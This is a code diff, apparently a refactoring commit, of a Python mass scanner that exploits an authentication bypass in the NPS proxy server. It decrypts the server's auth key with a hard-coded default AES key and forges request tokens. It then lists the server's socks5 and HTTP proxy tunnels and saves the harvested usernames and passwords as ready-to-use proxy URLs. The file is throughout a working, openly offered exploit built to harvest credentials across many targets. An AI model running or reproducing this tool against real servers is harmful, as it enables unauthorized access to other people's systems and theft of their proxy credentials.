@@ -17,9 +17,10 @@ import hashlib
 from loguru import logger
 
 # from Crypto.Cipher import AES
+from urllib3.exceptions import NewConnectionError, ConnectTimeoutError, MaxRetryError
 
 logger.remove()
-logger.add(sys.stdout, colorize=True, format='<green>{time:YYYY-MM-DD HH:mm:ss.SSS}</green> | <level>{message}</level>', level="INFO", enqueue=True)
+logger.add(sys.stdout, colorize=True, format="<green>{time:YYYY-MM-DD HH:mm:ss.SSS}</green> | <level>{message}</level>", level="INFO", enqueue=True)
 
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
@@ -31,11 +32,10 @@ def md5(s: str) -> str:
 
 
 class NpsScaner:
-
     def __init__(self, args):
         self.url = args["url"]
-        self.file = args["file"]
-        self.output = args["output"]
+        self.url_list = args["url_list"]
+        self.format = args["format"]
         self.verbose = args["verbose"]
         self.proxies = {
             "http": args["proxy"],
@@ -51,25 +51,25 @@ class NpsScaner:
             "Connection": "close"
         }
         # 存在漏洞的机器
-        self.vuln_f = open(f"result_vuln_{int(time.time())}.{self.output}", "a+", encoding="utf-8")
+        self.vuln_f = open(f"result_vuln_{int(time.time())}.txt", "a+", encoding="utf-8")
 
         # 输出处理
-        if self.output == "mongo":
+        if self.format == "mongo":
             import pymongo
             client = pymongo.MongoClient("mongodb://xxxxxx")
-            self.table = client['xx']['xx']
+            self.table = client["xx"]["xx"]
         else:
-            self.proxy_f = open(f"result_proxy_{int(time.time())}.{self.output}", "a+", encoding="utf-8")
+            self.proxy_f = open(f"result_proxy_{int(time.time())}.txt", "a+", encoding="utf-8")
 
         # url和文件
         if self.url:
-            url = self.url.strip('').rstrip('/')
+            url = self.url.strip("").rstrip("/")
             self.exp(url)
-        elif self.file:
-            with open(self.file, "r", encoding="utf-8") as f:
+        elif self.url_list:
+            with open(self.url_list, "r", encoding="utf-8") as f:
                 targets = f.read().splitlines()
             for target in targets:
-                self.exp(target.strip('').rstrip('/'))
+                self.exp(target.strip("").rstrip("/"))
 
     def exp(self, url):
         """
@@ -91,13 +91,13 @@ class NpsScaner:
         # 不再尝试这段注释代码中的默认crypt_auth_key情况
         # 有想改的人可以自己改改
         try:
-            burp0_url = url + '/auth/getauthkey'
+            burp0_url = url + "/auth/getauthkey"
             # 对应只修改了配置中auth_key 未修改auth_crypt_key的情况
             # 具体api内容见官方文档
             # https://github.com/ehang-io/nps/blob/c9a4d8285b30c3c140782fc660bfc3d6961262ed/docs/api.md#%E8%8E%B7%E5%8F%96%E6%9C%8D%E5%8A%A1%E7%AB%AFauthkey
             r = requests.get(burp0_url, proxies=self.proxies, headers=self.headers, timeout=2, verify=False, allow_redirects=False)
-            crypt_auth_key = r.json()['crypt_auth_key']
-            defaul_aes_key = b'1234567812345678'
+            crypt_auth_key = r.json()["crypt_auth_key"]
+            defaul_aes_key = b"1234567812345678"
             b_key = bytes.fromhex(crypt_auth_key)
             enc = AES.new(key=defaul_aes_key, mode=AES.MODE_CBC, iv=defaul_aes_key)
             config_auth_key = enc.decrypt(b_key).decode()
@@ -123,23 +123,25 @@ class NpsScaner:
             now_timestamp = str(int(time.time()))
             auth_key = md5(config_auth_key + now_timestamp)
             burp0_url = url + f"/index/gettunnel?auth_key={auth_key}&timestamp={now_timestamp}"
-            burp0_data = {"offset": "0", "limit": "100", "type": "socks5", "client_id": '', "search": ''}
+            burp0_data = {"offset": "0", "limit": "100", "type": "socks5", "client_id": "", "search": ""}
             r = requests.post(burp0_url, headers=self.headers, data=burp0_data, proxies=self.proxies, timeout=5, verify=False, allow_redirects=False)
-            if r.status_code == 302:
+            if r.status_code == 302 and r.headers["Location"] == "/login/index":
                 status["error"] = "不存在漏洞"
-            else:
+            elif r.status_code == 200 and r.headers["Content-Type"] == "application/json; charset=utf-8":
                 if r.json()["rows"]:
                     self.out(r.json()["rows"], url)
-                    status['socks5'] = len(r.json()["rows"])
+                    status["socks5"] = len(r.json()["rows"])
                 # 存在漏洞
                 status["hacked"] = True
                 self.vuln_f.write(url + "\n")
-                burp0_data = {"offset": "0", "limit": "100", "type": "httpProxy", "client_id": '', "search": ''}
+                burp0_data = {"offset": "0", "limit": "100", "type": "httpProxy", "client_id": "", "search": ""}
                 r = requests.post(burp0_url, headers=self.headers, data=burp0_data, proxies=self.proxies, timeout=4, verify=False, allow_redirects=False)
                 if r.json()["rows"]:
                     self.out(r.json()["rows"], url)
-                    status['http'] = len(r.json()["rows"])
-        except (ConnectionError, requests.exceptions.ReadTimeout):
+                    status["http"] = len(r.json()["rows"])
+            else:
+                status["error"] = "页面错误"
+        except (ConnectionError, requests.exceptions.ReadTimeout, NewConnectionError, requests.exceptions.ConnectionError, ConnectTimeoutError, MaxRetryError):
             status["error"] = "连接失败"
         except requests.exceptions.JSONDecodeError:
             status["error"] = "页面错误"
@@ -163,7 +165,7 @@ class NpsScaner:
         base_ip = urlparse(url).netloc.split(":")[0]
         if not j:
             return
-        elif self.output == "mongo":
+        elif self.format == "mongo":
             # 还要添加一下来源
             self.table.insert_many(j)
         else:
@@ -181,29 +183,28 @@ class NpsScaner:
                 if tunnel["User"] or tunnel["Pass"]:
                     tunnel["proxy_url"] = f"""{item["Mode"]}://{tunnel["User"]}:{tunnel["Pass"]}@{base_ip}:{item["Port"]}"""
 
-                if self.output == "json":
+                if self.format == "json":
                     output = json.dumps(tunnel)
-                elif self.output == "csv":
+                elif self.format == "csv":
                     output = ",".join(list(tunnel.values()))
                 else:
                     output = tunnel["proxy_url"]
-
                 self.proxy_f.write(output + "\n")
                 if self.verbose:
                     print(output)
 
 
-if __name__ == '__main__':
-    parser = argparse.ArgumentParser(description='''Nps auth bypass Scanner
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="""Nps auth bypass Scanner
 Author: Carrot2
 Github: https://github.com/carr0t2/nps-auth-bypass
 Example: python scan.py -u target_url -o txt -v
-         python scan.py -f file -o csv -p http://127.0.0.1:1080''', formatter_class=argparse.RawTextHelpFormatter, )
-    parser.add_argument('-u', '--url', type=str, help='Target url, such as 127.0.0.1:8080')
-    parser.add_argument('-f', '--file', type=str, help='Targets file path, such as xxx.txt')
-    parser.add_argument('-o', '--output', type=str, default="txt", help='Output format, such as txt, csv, json, mongodb')
-    parser.add_argument('-p', '--proxy', type=str, help='Proxy, such as http://127.0.0.1:1080')
-    parser.add_argument('-v', '--verbose', type=bool, help='Execute in verbose mode')
+         python scan.py -l url_list -o csv -p http://127.0.0.1:1080""", formatter_class=argparse.RawTextHelpFormatter, )
+    parser.add_argument("-u", "--url", type=str, help="Target URL")
+    parser.add_argument("-l", "--url-list", type=str, help="Target URL list file")
+    parser.add_argument("--format", type=str, default="txt", choices=["txt", "csv", "json", "mongodb"], help="Report format (Default: txt)")
+    parser.add_argument("-p", "--proxy", type=str, help="Proxy URL, support HTTP and SOCKS proxies \n(Example: http://localhost:8080, socks5://localhost:8088)")
+    parser.add_argument("-v", "--verbose", action='store_true', help="Execute in verbose mode")
     NpsScaner(vars(parser.parse_args()))
 
 """
